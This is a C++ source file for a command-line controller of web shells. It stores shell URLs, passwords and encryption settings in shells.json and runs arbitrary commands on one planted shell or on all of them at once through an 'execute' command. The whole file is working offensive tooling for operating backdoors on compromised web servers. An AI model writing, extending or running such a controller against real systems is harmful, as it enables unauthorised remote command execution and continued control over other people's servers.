#include"WebShell.h"
#include<iostream>
#include<string>
#include<vector>
#include<sstream>
#include<exception>
#include"json.hpp"

using namespace std;
using json = nlohmann::json;
vector<WebShell> shells;
json j;
bool addShell(WebShell shell){
	try{
		shells.push_back(shell);
	}
	catch(exception& e){
		cout<<"[-]failed to add new shell:"<<e.what()<<endl;
		return false;
	}
	return true;
}

WebShell parseShell(json shell){
	METHOD meth;
	if(shell["method"].get<string>()=="GET")meth=GET;
	else meth=POST;
	WebShell temp(shell["address"].get<string>(),meth,shell["pass"].get<string>());
	if(shell["custom"].is_object()){
		if(shell["custom"]["encrypt"].is_string())
			temp.ParseMethod(shell["custom"]["encrypt"].get<string>());
		if(shell["custom"]["place"].is_string() && shell["custom"]["placevalue"].is_string())
			temp.setPlace(shell["custom"]["place"].get<string>(),shell["custom"]["placevalue"].get<string>());
		if(shell["custom"]["addonget"].is_object()){
			for(json::iterator getIter=shell["custom"]["addonget"].begin();getIter!=shell["custom"]["addonget"].end();++getIter){
				temp.addAddonGet(getIter.key(),getIter.value().get<string>());
			}
		}
		if(shell["custom"]["addonpost"].is_object()){
			for(json::iterator postIter=shell["custom"]["addonpost"].begin();postIter!=shell["custom"]["addonpost"].end();++postIter){
				temp.addAddonPost(postIter.key(),postIter.value().get<string>());
			}
		}
	}
	j.push_back(shell);
	fstream of("shells.json",ios::out);
	of<<j;
	of.close();
	return temp;
}
template<typename T>T stringToNum(string &str){
	istringstream stream(str.c_str());
	T num;
	stream>>num;
	return num;
}
int main(){
	try{
		ifstream config("shells.json");
		if(config.is_open()){
			config>>j;
		}
		config.close();
		if(j.is_array()){
			for(json::iterator it=j.begin();it!=j.end();++it){
				METHOD meth;
				if((*it)["method"].get<string>()=="GET")meth=GET;
				else meth=POST;
				WebShell temp((*it)["address"].get<string>(),meth,(*it)["pass"].get<string>());
				if((*it)["custom"].is_object()){
					if((*it)["custom"]["encrypt"].is_string())
						temp.ParseMethod((*it)["custom"]["encrypt"].get<string>());
					if((*it)["custom"]["place"].is_string() && (*it)["custom"]["placevalue"].is_string())
						temp.setPlace((*it)["custom"]["place"].get<string>(),(*it)["custom"]["placevalue"].get<string>());
					if((*it)["custom"]["addonget"].is_object()){
						for(json::iterator getIter=(*it)["custom"]["addonget"].begin();getIter!=(*it)["custom"]["addonget"].end();++getIter){
							temp.addAddonGet(getIter.key(),getIter.value().get<string>());
						}
					}
					if((*it)["custom"]["addonpost"].is_object()){
						for(json::iterator postIter=(*it)["custom"]["addonpost"].begin();postIter!=(*it)["custom"]["addonpost"].end();++postIter){
							temp.addAddonPost(postIter.key(),postIter.value().get<string>());
						}
					}
				}
				shells.push_back(temp);
			}
		}
	}
		catch(exception& e){
			cout<<"[-]exception occured:"<<e.what()<<endl;
		}
		string command;
		cout<<">";
		while(getline(cin,command)){
			try{
			vector<string> parseRes;
			int begin,end;
			begin=end=0;
			int i=0;
			while((end=command.find(' ',begin))!=string::npos){
				parseRes.push_back(command.substr(begin,end-begin));
				begin=command.find_first_not_of(' ',end);
				i++;
				if(i==2) 
				break;
			}
			parseRes.push_back(command.substr(begin));
			if(parseRes.size()>0){
				if(parseRes[0]=="add"){
					if(parseRes.size()!=2){
						cerr<<"[-]invalid syntax"<<endl;
						continue;
					}
					auto temp=json::parse(command.substr(parseRes[0].length()));
					if(temp.is_object()){
						shells.push_back(parseShell(temp));
					}
					else{
						cerr<<"[-]parse error"<<endl;
						continue;
					}
				}
				else if(parseRes[0]=="delete"){
					if(parseRes.size()!=2){
						cerr<<"[-]invalid syntax"<<endl;
						continue;
					}
					int num=stringToNum<int>(parseRes[1]);
					if(num>=shells.size() || num<0){
						cerr<<"[-]num exceeded"<<endl;
						continue;
					}
					shells.erase(shells.begin()+num);
					j.erase(j.begin()+num);
					fstream config("shells.json",ios::out);
					config<<j;
					config.close();
				}
				else if(parseRes[0]=="execute"){
					if(parseRes.size()!=3){
						cerr<<"[-]invalid syntax"<<endl;
						continue;
					}
					if(parseRes[1]=="all"){
						for(vector<WebShell>::iterator it=shells.begin();it!=shells.end();++it){
							cout<<"executing command "<<parseRes[2]<<" on "<<it->getAddress()<<endl;
							cout<<"-------------------------------------------"<<endl;
							string answer;
							CURLcode code=it->ShellCommandExec(parseRes[2],answer);
							cout<<answer<<endl;
							cout<<"-------------------------------------------"<<endl;
						}
					}
					else{
						int num=stringToNum<int>(parseRes[1]);
						if(num>=shells.size() || num<0){
							cerr<<"[-]num exceeded"<<endl;
							continue;
						}
						cout<<"executing command "<<parseRes[2]<<" on "<<shells[num].getAddress()<<endl;
						cout<<"-------------------------------------------"<<endl;
						string answer;
						shells[num].ShellCommandExec(parseRes[2],answer);
						cout<<answer<<endl;
						cout<<"-------------------------------------------"<<endl;
					}
				}
				else if(parseRes[0]=="list"){
					for(vector<WebShell>::iterator it=shells.begin();it!=shells.end();++it){
						cout<<"Shell["<<it-shells.begin()<<"] on "<<it->getAddress()<<endl;
					}
				}
				else{
					cout<<"[+]Usage:\n"
					"list: show all the shells\n"
					"add jsondata:add a shell\n"
					"delete index:delete a shell\n"
					"execute index command: execute command on a shell or all the shells\n"
					<<endl;
				}
			}
			else{
				cout<<"[+]Usage:\n"
				"list: show all the shells\n"
				"add jsondata:add a shell\n"
				"delete index:delete a shell\n"
				"execute index command: execute command on a shell or all the shells\n"
				<<endl;
			}
		}
		catch(exception& e){
			cout<<"[-]exception occured:"<<e.what()<<endl;
		}
		cout<<">";
	}
	
}
